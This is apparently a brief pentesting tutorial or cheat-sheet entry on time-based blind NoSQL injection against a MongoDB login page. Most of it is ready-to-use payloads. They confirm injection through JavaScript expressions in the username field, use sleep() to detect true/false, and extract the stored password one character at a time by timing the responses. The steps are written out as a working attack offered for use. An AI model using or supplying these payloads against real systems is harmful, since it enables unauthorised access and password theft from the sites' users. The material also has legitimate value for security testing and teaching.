This particular type of "BLIND" injection is useful when the victim fronted answer with always same response, no matter if success/failure.
We can circumvent this by using the sleep() function in order to get success/failure.

# Case scenario
You have a login page that used MongoDB aka NOSQL and no matter if you succeed or fail it always give you back the same error message ex "Impossible to login!"
```
base request: 
username=test&password=test
```

## Exploit:
1)Start by testing for a base payload:  `"+||+(this.username.match('^.*'))+||+""=="`
`username="+||+(this.username.match('^.*'))+||+""=="&password=test`

2)If you get no changes in response then you can test to inject a sleep of 1 sec: `"+||+(sleep(1000))+||+""=="username="+||+(sleep(1000))+||+""=="&password=test`

3)If you see that the response takes more than 1000ms then you are gucci!

4)Now you can compose your exploit example to dump the password by using this code: `function(x){if(x.password[0]==="a"){sleep(5000)};}(this)`
`username="+||+(function(x){if(x.password[0]==="a"){sleep(5000)};}(this))+||+""=="&password=test`

5)Iterate the index of the `x.password[i]==="char" and check if response>1sec then you have BOOL=TRUE aka success!`
